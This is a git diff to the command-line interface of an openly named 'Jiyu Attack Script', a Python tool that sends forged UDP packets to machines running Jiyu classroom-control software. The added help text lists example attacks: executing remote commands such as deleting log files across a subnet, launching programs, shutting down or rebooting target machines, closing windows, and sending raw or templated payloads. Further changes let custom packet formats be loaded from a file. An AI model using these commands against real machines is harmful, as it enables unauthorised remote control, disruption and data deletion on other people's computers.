@@ -78,7 +78,24 @@ class ModeOptionalAction(argparse.Action):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         description="Jiyu Attack Script",
-        epilog="Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/",
+        epilog="Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ \n \n"
+        "Example usage:\n"
+        '    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World" -i 1000\n'
+        "    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com\n"
+        '    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log"\n'
+        "    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe\n"
+        "    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
+        '    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
+        '    python Jiyu_udp_attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
+        "    python Jiyu_udp_attack -t 192.168.106.255 -cw\n"
+        "    python Jiyu_udp_attack -t 192.168.106.100 -ctw\n"
+        "    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000\n"
+        "    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
+        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
+        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.little_4}" 1024\n'
+        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
+        "    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n",
+        formatter_class=argparse.RawTextHelpFormatter,
     )
     network_config_group = parser.add_argument_group(
         "Network Configuration", "Specify the network configuration for the attack."
@@ -147,7 +164,7 @@ if __name__ == "__main__":
         "--command",
         type=str,
         metavar="<command>",
-        help="Execute a command on the target machine (`cmd /D /C <command>`, Windows only)",
+        help="Execute a command on the target machine\n(`cmd /D /C <command>`, Windows only)",
     )
     temp = attack_action.add_argument(
         "-e",
@@ -165,7 +182,7 @@ if __name__ == "__main__":
         nargs="*",
         default=None,
         metavar=("<timeout>", "<message>"),
-        help="Shutdown the target machine, optionally with a timeout and message",
+        help="Shutdown the target machine,\noptionally with a timeout and message",
     )
     attack_action.add_argument(
         "-r",
@@ -173,7 +190,7 @@ if __name__ == "__main__":
         nargs="*",
         default=None,
         metavar=("<timeout>", "<message>"),
-        help="Reboot the target machine, optionally with a timeout and message",
+        help="Reboot the target machine,\noptionally with a timeout and message",
     )
     attack_action.add_argument(
         "-cw",
@@ -270,6 +287,11 @@ if __name__ == "__main__":
             payload = binascii.unhexlify(args.hex.replace(" ", ""))
         elif args.pkg:
             format_str, *user_args = args.pkg
+            if not format_str.startswith(":"):
+                with open(format_str, "r", encoding="utf-8") as f:
+                    format_str = f.read().strip()
+            else:
+                format_str = format_str[1:]  # Remove leading ':'
             payload = pkg_customize(format_str, *user_args)
         else:
             raise ValueError("Program logic error, please report this issue: No valid action specified.")
